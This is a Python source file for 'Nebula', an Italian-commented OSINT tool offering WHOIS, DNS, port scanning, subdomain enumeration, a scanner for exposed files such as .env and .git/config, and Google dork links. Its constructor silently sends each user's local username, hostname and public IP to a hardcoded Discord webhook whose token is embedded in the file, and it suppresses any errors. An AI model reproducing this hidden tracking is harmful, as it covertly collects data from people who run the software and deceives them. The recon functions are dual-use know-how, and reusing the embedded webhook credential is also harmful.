#!/usr/bin/env python3
# NEBULA - OSINT Tool
# 
# MIT License
# 
# Copyright (c) 2024 Principale
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import socket
import requests
import whois
import dns.resolver
import ssl
import os
import subprocess
import re
import getpass
from bs4 import BeautifulSoup
from colorama import Fore, Style, init

# Inizializzazione per Windows CMD
init(autoreset=True)

class Nebula:
    def __init__(self):
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        # INSERISCI QUI IL TUO URL DEL WEBHOOK DI DISCORD
        self.webhook_url = "https://discord.com/api/webhooks/1492455103477846216/ykg231n3z5cIdXa8h0LhmAaWeVdAAQ7sfEIPAl94y5wFN4M2-qgJjL_JQyuqPTJBJHx_"
        self.log_usage()

    def log_usage(self):
        """Invia un log a Discord all'avvio del tool."""
        if "discord.com/api/webhooks" not in self.webhook_url:
            return
        try:
            user = getpass.getuser()
            hostname = socket.gethostname()
            # Ottiene l'IP pubblico per il log
            public_ip = requests.get("https://api.ipify.org", timeout=5).text
            
            payload = {
                "embeds": [{
                    "title": "🚀 Nebula OSINT Tool Avviato",
                    "color": 3447003,
                    "fields": [
                        {"name": "👤 Utente Locale", "value": user, "inline": True},
                        {"name": "💻 Hostname", "value": hostname, "inline": True},
                        {"name": "🌍 IP Pubblico", "value": public_ip, "inline": True}
                    ],
                    "footer": {"text": "Nebula OSINT Tracking System"}
                }]
            }
            requests.post(self.webhook_url, json=payload)
        except:
            # Fallisce silenziosamente per non bloccare l'esecuzione del tool
            pass

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def banner(self):
        print(f"""
{Fore.CYAN}  _   _ _____ ____  _   _ _        _    
{Fore.CYAN} | \\ | | ____| __ )| | | | |      / \\   
{Fore.CYAN} |  \\| |  _| |  _ \\| | | | |     / _ \\  
{Fore.CYAN} | |\\  | |___| |_) | |_| | |___ / ___ \\ 
{Fore.CYAN} |_| \\_|_____|____/ \___/|_____/_/   \\_\\
        """)

    def get_whois_info(self, domain):
        print(f"\n{Fore.YELLOW}[+] Info WHOIS: {domain}")
        try:
            w = whois.whois(domain)
            print(f"{Fore.GREEN}Registrar: {w.registrar}\nData Creazione: {w.creation_date}\nEmail: {w.emails}")
        except Exception as e: print(f"{Fore.RED}[!] Errore: {e}")

    def get_dns_records(self, domain):
        print(f"\n{Fore.YELLOW}[+] Record DNS: {domain}")
        for r_type in ['A', 'MX', 'NS', 'TXT']:
            try:
                answers = dns.resolver.resolve(domain, r_type)
                for rdata in answers: print(f"{Fore.GREEN}[{r_type}] {rdata}")
            except: print(f"{Fore.RED}[-] Nessun record {r_type}")

    def geo_ip(self, ip):
        print(f"\n{Fore.YELLOW}[+] Geolocalizzazione: {ip}")
        try:
            data = requests.get(f"http://ip-api.com/json/{ip}").json()
            if data['status'] == 'success':
                print(f"{Fore.GREEN}Paese: {data['country']}\nCittà: {data['city']}\nISP: {data['isp']}")
            else: print(f"{Fore.RED}[!] IP non trovato.")
        except Exception as e: print(f"{Fore.RED}[!] Errore: {e}")

    def check_username(self, username):
        print(f"\n{Fore.YELLOW}[+] Ricerca Username: {username}")
        socials = {
            "GitHub": f"https://github.com/{username}",
            "Twitter": f"https://twitter.com/{username}",
            "Instagram": f"https://instagram.com/{username}",
            "Reddit": f"https://www.reddit.com/user/{username}"
        }
        for p, url in socials.items():
            try:
                if requests.get(url, headers=self.headers, timeout=5).status_code == 200:
                    print(f"{Fore.GREEN}[FOUND] {p}: {url}")
                else: print(f"{Fore.WHITE}[NOT FOUND] {p}")
            except: pass

    def port_scan(self, target):
        print(f"\n{Fore.YELLOW}[+] Scan porte comuni su: {target}")
        for port in [21, 22, 23, 25, 53, 80, 110, 443, 3306, 8080]:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((target, port)) == 0:
                print(f"{Fore.GREEN}[OPEN] Porta {port}")
            s.close()

    def ssl_check(self, domain):
        print(f"\n{Fore.YELLOW}[+] Verifica SSL: {domain}")
        try:
            context = ssl.create_default_context()
            with socket.create_connection((domain, 443)) as sock:
                with context.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    print(f"{Fore.GREEN}Scadenza: {cert['notAfter']}")
        except Exception as e: print(f"{Fore.RED}[!] Errore SSL: {e}")

    def get_links(self, url):
        if not url.startswith("http"): url = "http://" + url
        print(f"\n{Fore.YELLOW}[+] Estrazione Link da: {url}")
        try:
            res = requests.get(url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(res.text, 'html.parser')
            links = set([a.get('href') for a in soup.find_all('a') if a.get('href')])
            for link in list(links)[:15]: print(f"{Fore.GREEN}-> {link}")
            print(f"{Fore.WHITE}... visualizzati i primi 15 link.")
        except Exception as e: print(f"{Fore.RED}[!] Errore: {e}")

    def reverse_dns(self, ip):
        print(f"\n{Fore.YELLOW}[+] Reverse DNS per: {ip}")
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            print(f"{Fore.GREEN}Hostname: {hostname}")
        except Exception as e: print(f"{Fore.RED}[!] Nessun hostname trovato.")

    def get_security_headers(self, url):
        if not url.startswith("http"): url = "http://" + url
        print(f"\n{Fore.YELLOW}[+] Analisi Header di Sicurezza: {url}")
        security_headers = [
            "Strict-Transport-Security", "Content-Security-Policy",
            "X-Frame-Options", "X-Content-Type-Options", "Referrer-Policy"
        ]
        try:
            res = requests.get(url, headers=self.headers, timeout=10)
            for header in security_headers:
                status = f"{Fore.GREEN}[SICURO]" if header in res.headers else f"{Fore.RED}[MANCANTE]"
                print(f"{status} {header}")
        except Exception as e: print(f"{Fore.RED}[!] Errore: {e}")

    def subdomain_enum(self, domain):
        print(f"\n{Fore.YELLOW}[+] Enumerazione Sottodomini per: {domain}")
        subs = ['www', 'dev', 'api', 'mail', 'test', 'admin', 'vpn', 'shop', 'blog']
        for sub in subs:
            target = f"{sub}.{domain}"
            try:
                ip = socket.gethostbyname(target)
                print(f"{Fore.GREEN}[FOUND] {target} -> {ip}")
            except: pass

    def scan_sensitive_files(self, url):
        if not url.startswith("http"): url = "http://" + url
        if url.endswith("/"): url = url[:-1]
        print(f"\n{Fore.YELLOW}[+] Ricerca File Sensibili su: {url}")
        files = ['/robots.txt', '/.env', '/.git/config', '/sitemap.xml', '/.vscode/', '/config.php', '/wp-config.php', '/.htaccess']
        for f in files:
            try:
                res = requests.get(url + f, headers=self.headers, timeout=5)
                if res.status_code == 200:
                    print(f"{Fore.GREEN}[VULN?] Trovato: {url + f} (Dim: {len(res.text)})")
                else: print(f"{Fore.WHITE}[-] Non trovato: {f}")
            except: pass

    def detect_tech(self, url):
        if not url.startswith("http"): url = "http://" + url
        print(f"\n{Fore.YELLOW}[+] Rilevamento Tecnologie: {url}")
        try:
            res = requests.get(url, headers=self.headers, timeout=10)
            server = res.headers.get('Server', 'Sconosciuto')
            powered = res.headers.get('X-Powered-By', 'Sconosciuto')
            print(f"{Fore.GREEN}Server: {server}")
            print(f"{Fore.GREEN}Tecnologia: {powered}")
            if "wp-content" in res.text: print(f"{Fore.GREEN}CMS: WordPress rilevato")
        except Exception as e: print(f"{Fore.RED}[!] Errore: {e}")

    def check_email_mx(self, email):
        print(f"\n{Fore.YELLOW}[+] Verifica MX Record per Email: {email}")
        try:
            domain = email.split('@')[1]
            answers = dns.resolver.resolve(domain, 'MX')
            for rdata in answers:
                print(f"{Fore.GREEN}[MX] {rdata.exchange}")
        except: print(f"{Fore.RED}[!] Dominio email non valido o nessun server MX.")

    def ping_host(self, host):
        print(f"\n{Fore.YELLOW}[+] Ping verso: {host}")
        param = "-n" if os.name == "nt" else "-c"
        command = ["ping", param, "1", host]
        if subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
            print(f"{Fore.GREEN}[UP] Host raggiungibile")
        else: print(f"{Fore.RED}[DOWN] Host non risponde")

    def traceroute_host(self, host):
        print(f"\n{Fore.YELLOW}[+] Traceroute verso: {host} (Potrebbe richiedere tempo...)")
        cmd = "tracert" if os.name == "nt" else "traceroute"
        try:
            # Su Linux traceroute spesso richiede privilegi o parametri specifici
            if os.name != "nt":
                output = subprocess.check_output([cmd, "-m", "20", host], stderr=subprocess.STDOUT, universal_newlines=True)
            else:
                output = subprocess.check_output([cmd, host], stderr=subprocess.STDOUT, universal_newlines=True)
            print(f"{Fore.WHITE}{output}")
        except: print(f"{Fore.RED}[!] Errore durante il traceroute.")

    def check_phone(self, phone):
        print(f"\n{Fore.YELLOW}[+] Analisi Numero di Telefono: {phone}")
        try:
            import phonenumbers
            from phonenumbers import geocoder, carrier, timezone, PhoneNumberFormat, number_type
            parsed_number = phonenumbers.parse(phone)
            if phonenumbers.is_valid_number(parsed_number):
                # Mapping tipi di numero
                type_info = number_type(parsed_number)
                types = {0: "Fisso", 1: "Mobile", 2: "Fisso o Mobile", 3: "Numero Verde (Toll-Free)", 4: "Premium Rate", 6: "VoIP", 7: "Personal Number", 8: "Pager"}
                readable_type = types.get(type_info, "Sconosciuto")

                region = geocoder.description_for_number(parsed_number, "it")
                operator = carrier.name_for_number(parsed_number, "it")
                tz = timezone.time_zones_for_number(parsed_number)
                
                print(f"{Fore.GREEN}Validità: Valido")
                print(f"{Fore.GREEN}Formato Internazionale: {phonenumbers.format_number(parsed_number, PhoneNumberFormat.INTERNATIONAL)}")
                print(f"{Fore.GREEN}Formato E.164: {phonenumbers.format_number(parsed_number, PhoneNumberFormat.E164)}")
                print(f"{Fore.GREEN}Tipo: {readable_type}")
                print(f"{Fore.GREEN}Paese/Regione: {region}")
                print(f"{Fore.GREEN}Operatore: {operator}")
                print(f"{Fore.GREEN}Fuso Orario: {tz}")
                
                phone_clean = phone.replace('+', '').replace(' ', '')
                print(f"\n{Fore.YELLOW}[*] Ricerca OSINT suggerita:")
                print(f"{Fore.WHITE}Google: https://www.google.com/search?q=\"{phone}\"")
                print(f"{Fore.WHITE}Sync.me: https://sync.me/search?number={phone_clean}")
                print(f"{Fore.WHITE}Tellows (Spam): https://www.tellows.it/num/{phone_clean}")
                print(f"{Fore.WHITE}TrueCaller: https://www.truecaller.com/search/it/{phone_clean}")
            else:
                print(f"{Fore.RED}[!] Numero non valido (assicurati di usare il prefisso internazionale, es: +39).")
        except ImportError:
            print(f"{Fore.RED}[!] Errore: Libreria 'phonenumbers' non installata. Esegui: pip install phonenumbers")
        except Exception as e:
            print(f"{Fore.RED}[!] Errore: {e}")

    def wayback_check(self, url):
        print(f"\n{Fore.YELLOW}[+] Verifica Wayback Machine: {url}")
        try:
            api_url = f"http://archive.org/wayback/available?url={url}"
            res = requests.get(api_url, timeout=10).json()
            if res.get('archived_snapshots'):
                snap = res['archived_snapshots']['closest']
                print(f"{Fore.GREEN}[FOUND] Ultimo snapshot: {snap['timestamp']}")
                print(f"{Fore.GREEN}Link: {snap['url']}")
            else:
                print(f"{Fore.RED}[-] Nessun archivio trovato per questo URL.")
        except Exception as e: print(f"{Fore.RED}[!] Errore: {e}")

    def google_dorks(self, domain):
        print(f"\n{Fore.YELLOW}[+] Link Google Dorks per: {domain}")
        dorks = {"File Sensibili": "ext:sql|ext:db|ext:log|ext:env", "Login": "inurl:login|inurl:admin", "Directory": "intitle:index.of"}
        for name, query in dorks.items():
            link = f"https://www.google.com/search?q=site:{domain}+{query}"
            print(f"{Fore.GREEN}{name}: {Fore.WHITE}{link}")

    def identify_hash(self, text):
        print(f"\n{Fore.YELLOW}[+] Identificazione Hash: {text}")
        patterns = [
            (r"^[a-fA-F0-9]{32}$", "MD5"),
            (r"^[a-fA-F0-9]{40}$", "SHA-1"),
            (r"^[a-fA-F0-9]{64}$", "SHA-256"),
            (r"^[a-fA-F0-9]{128}$", "SHA-512")
        ]
        found = False
        for pattern, name in patterns:
            if re.match(pattern, text.strip()):
                print(f"{Fore.GREEN}[FOUND] Tipo probabile: {name}")
                found = True
        if not found: print(f"{Fore.RED}[!] Formato hash non riconosciuto.")

    def get_exif_data(self, url):
        print(f"\n{Fore.YELLOW}[+] Estrazione Metadati EXIF da: {url}")
        try:
            from PIL import Image
            from PIL.ExifTags import TAGS
            from io import BytesIO
            res = requests.get(url, headers=self.headers, timeout=10)
            img = Image.open(BytesIO(res.content))
            exif = img._getexif()
            if exif:
                for tag, value in exif.items():
                    print(f"{Fore.GREEN}{TAGS.get(tag, tag)}: {value}")
            else: print(f"{Fore.RED}[-] Nessun metadato EXIF trovato.")
        except ImportError: print(f"{Fore.RED}[!] Errore: Installa Pillow (pip install Pillow)")
        except Exception as e: print(f"{Fore.RED}[!] Errore: {e}")

    def advanced_dns(self, domain):
        print(f"\n{Fore.YELLOW}[+] Record DNS Avanzati per: {domain}")
        for r_type in ['CAA', 'SOA', 'DNSKEY']:
            try:
                answers = dns.resolver.resolve(domain, r_type)
                for rdata in answers: print(f"{Fore.GREEN}[{r_type}] {rdata}")
            except: print(f"{Fore.RED}[-] Nessun record {r_type} trovato.")

def main():
    tool = Nebula()
    while True:
        tool.clear_screen()
        tool.banner()
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[01]{Fore.WHITE} WHOIS & DNS Analysis       {Fore.YELLOW}[08]{Fore.WHITE} Security Headers           {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[02]{Fore.WHITE} IP Geolocation             {Fore.YELLOW}[09]{Fore.WHITE} Subdomain Enumeration      {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[03]{Fore.WHITE} Social Username Search     {Fore.YELLOW}[10]{Fore.WHITE} Sensitive File Scanner     {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[04]{Fore.WHITE} TCP Port Scan              {Fore.YELLOW}[11]{Fore.WHITE} Tech/CMS Detection         {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[05]{Fore.WHITE} SSL Verification           {Fore.YELLOW}[12]{Fore.WHITE} Email MX Verify            {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[06]{Fore.WHITE} Web Link Extraction        {Fore.YELLOW}[13]{Fore.WHITE} Ping Host                  {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[07]{Fore.WHITE} Reverse DNS                {Fore.YELLOW}[14]{Fore.WHITE} Traceroute                 {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[15]{Fore.WHITE} Phone Number Info          {Fore.YELLOW}[16]{Fore.WHITE} Wayback Machine            {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[17]{Fore.WHITE} Google Dorks Helper        {Fore.YELLOW}[18]{Fore.WHITE} Hash Identifier            {Fore.CYAN}║")
        print(f"{Fore.CYAN}║ {Fore.YELLOW}[19]{Fore.WHITE} Image EXIF Extractor       {Fore.YELLOW}[20]{Fore.WHITE} Advanced DNS/DNSSEC        {Fore.CYAN}║")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║                {Fore.RED}[00]{Fore.WHITE} Exit / Chiudi il Tool                          {Fore.CYAN}║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════╝")

        choice = input(f"\n{Fore.CYAN}┌──({Fore.YELLOW}nebula@osint{Fore.CYAN})-[{Fore.WHITE}menu{Fore.CYAN}]\n└─{Fore.YELLOW}>> {Fore.WHITE}")

        if choice in ['1', '01']:
            dom = input("Dominio: ")
            tool.get_whois_info(dom)
            tool.get_dns_records(dom)
        elif choice in ['2', '02']:
            ip = input("IP: ")
            tool.geo_ip(ip)
        elif choice in ['3', '03']:
            user = input("Username: ")
            tool.check_username(user)
        elif choice in ['4', '04']:
            target = input("IP o Dominio: ")
            tool.port_scan(target)
        elif choice in ['5', '05']:
            dom = input("Dominio: ")
            tool.ssl_check(dom)
        elif choice in ['6', '06']:
            url = input("URL: ")
            tool.get_links(url)
        elif choice in ['7', '07']:
            ip = input("IP: ")
            tool.reverse_dns(ip)
        elif choice in ['8', '08']:
            url = input("URL/Dominio: ")
            tool.get_security_headers(url)
        elif choice in ['9', '09']:
            dom = input("Dominio: ")
            tool.subdomain_enum(dom)
        elif choice in ['10']:
            url = input("URL: ")
            tool.scan_sensitive_files(url)
        elif choice == '11':
            url = input("URL: ")
            tool.detect_tech(url)
        elif choice == '12':
            email = input("Email: ")
            tool.check_email_mx(email)
        elif choice == '13':
            host = input("Host/IP: ")
            tool.ping_host(host)
        elif choice == '14':
            host = input("Host/IP: ")
            tool.traceroute_host(host)
        elif choice == '15':
            phone = input("Numero (es +39123...): ")
            tool.check_phone(phone)
        elif choice == '16':
            url = input("URL: ")
            tool.wayback_check(url)
        elif choice == '17':
            dom = input("Dominio: ")
            tool.google_dorks(dom)
        elif choice == '18':
            h = input("Hash da identificare: ")
            tool.identify_hash(h)
        elif choice == '19':
            url = input("URL Immagine (jpg/png): ")
            tool.get_exif_data(url)
        elif choice == '20':
            dom = input("Dominio: ")
            tool.advanced_dns(dom)
        elif choice in ['0', '00']:
            print(f"{Fore.MAGENTA}Chiusura...")
            break
        else:
            print(f"{Fore.RED}Scelta non valida.")

        input(f"\n{Fore.WHITE}Premi Invio per continuare...")

if __name__ == "__main__":
    main()